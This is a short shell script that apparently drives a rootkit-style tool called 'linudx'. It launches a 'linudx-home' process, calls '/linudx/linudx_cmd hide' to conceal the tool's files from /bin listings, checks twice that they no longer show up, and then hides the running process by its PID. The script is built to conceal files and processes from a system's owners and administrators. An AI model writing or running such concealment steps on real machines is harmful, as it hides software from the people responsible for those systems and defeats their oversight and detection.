#! /bin/sh

linudx-home
p1=`pidof linudx-home`
############################
/linudx/linudx_cmd hide
if [ "`ls /bin | grep linudx`" ];then
  /linudx/linudx_cmd hide 
else
  echo "hide success check1"
fi

if [ "`ls /bin | grep linudx`" ];then
  echo "hide failed" 
else
  echo "hide success check2"
fi
########################
/linudx/linudx_cmd hide $p1
